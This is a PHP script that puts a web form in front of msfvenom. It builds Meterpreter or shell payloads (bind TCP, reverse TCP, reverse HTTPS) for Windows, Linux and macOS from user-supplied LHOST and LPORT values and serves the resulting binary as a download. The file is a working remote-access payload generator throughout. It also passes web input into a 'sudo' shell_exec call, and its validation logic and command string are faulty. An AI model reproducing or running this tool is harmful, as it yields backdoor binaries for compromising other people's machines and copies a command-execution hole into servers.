<?php


  $os = htmlspecialchars($_POST['OSSelector']);
  $payload  = htmlspecialchars($_POST['PayloadSelector']);
  $LHOST = htmlspecialchars($_POST['LHOST']);
  $LPORT = htmlspecialchars($_POST['LPORT']);

/*
		 $os = 'linux';
		  $payload = 'bindtcp';
		  $LHOST = '127.0.0.1';
		  $LPORT = '9999';
*/

  //echo "Strlen LHOST:".strlen($LHOST)."\n";
  //echo "Strlen LPORT:".strlen($LPORT)."\n";


  if(($os != null) || ($payload != null) || (strlen($LHOST) != 0) || (strlen($LPORT) != 0)){
  	echo $os, $payload,$LHOST,$LPORT;
  	$b = new BinaryTools();
  	$b->CreateBinary($os, $payload, $LHOST, $LPORT);
  }else{
  	echo "the ponies you are looking for have moved ;)";
  }
  



class BinaryTools {
	private $binaryId; //the temporary id each file will be named
	private $OS;
	private $FileType;
	private $Payload;
	private $LHOST;
	private $LPORT;

	function __construct(){
		$this->binaryId = rand(0,2000); //set the binary id from 0-2000.  need to make this larger later
	}
	

	function CreateBinary($os, $payload, $LHOST, $LPORT){
		if($os == 'windows'){
			$this->binaryId = rand(0,2000).".exe";
		}

		switch($os){
			case 'windows':
				$this->OS =" --platform windows ";
				$this->FileType = "exe ";
				break;
			case 'linux':
				$this->OS = " --platform linux ";
				$this->FileType = "elf ";
				break;
			case 'osx':
				$this->OS = " --platform osx ";
				$this->FileType = "macho ";
				break;
			default:
				$this->OS = null;
				break;
		}

		switch($payload){
			//windows cases
			case 'bindtcp':
				if($os == 'windows'){
						$this->Payload = " -p windows/meterpreter/bind_tcp ";
				}
				elseif($os == 'linux'){
						$this->Payload = " -p linux/x86/meterpreter/bind_tcp ";
				}
				elseif($os == 'osx'){
						$this->Payload = " -p osx/x64/shell_bind_tcp ";
				}
				break;
			case 'reversetcp':
				if($os == 'windows'){
						$this->Payload = " -p windows/meterpreter/reverse_tcp ";
				}
				elseif($os == 'linux'){
						$this->Payload = " -p linux/x86/meterpreter/reverse_tcp ";
				}
				elseif($os == 'osx'){
						$this->Payload = " -p osx/x64/shell_reverse_tcp ";
				}
				break;
			case 'reversehttps':
				if($os == 'windows'){
						$this->Payload = " -p windows/meterpreter/reverse_https ";
				}
				elseif($os == 'linux'){
						$this->Payload = " -p linux/x86/meterpreter/reverse_https ";
				}
				elseif($os == 'osx'){
						$this->Payload = " -p osx/x64/shell_reverse_tcp ";
				}
				break;
			default:
				$this->Payload = null;
		}

		if (!filter_var($LHOST, FILTER_VALIDATE_IP) === false) {
		    $this->LHOST = $LHOST;
		} else {
		    $this->LHOST = null;
		}

		if((1 <= $LPORT) && ($LPORT <= 65535)){
			$this->LPORT = $LPORT;
		}else{
			$this->LPORT = null;
		}



		if(($this->OS != null) || ($this->payload != null) || ($this->LHOST != null) || ($this->LPORT != null)){
			echo "/usr/bin/msfvenom ".$this->OS.$this->Payload."LHOST=".$this->LHOST." LPORT=".$this->LPORT." -f ".$this->FileType." -o ./files/".$this->binaryId;
			shell_exec(" sudo /usr/bin/msfvenom ".$this->OS.$this->Payload."LHOST=".$this->LHOST."LPORT=".$this->LPORT."-f ".$this->FileType." -o ./files/".$this->binaryId); //this is the path on kali
			$this->ReturnBinaryFile($this->binaryId);
		}else{
			echo "AHHHH WHYYYYYY";
		}

	}

	function ReturnBinaryFile($file){
	//download a file || return a file
	$attachment_location = $_SERVER["DOCUMENT_ROOT"] ."/files/". $file;
	echo $attachment_location;
	        if (file_exists($attachment_location)) {

	            header($_SERVER["SERVER_PROTOCOL"] . " 200 OK");
	            header("Cache-Control: public"); // needed for i.e.
	            header("Content-Type: application/zip");
	            header("Content-Transfer-Encoding: Binary");
	            header("Content-Length:".filesize($attachment_location));
	            header("Content-Disposition: attachment; filename=".$file);
	            readfile($attachment_location);
	            //die();        
	        } else {
	            die("Error: File not found.");
	        } 

	}



}



?>


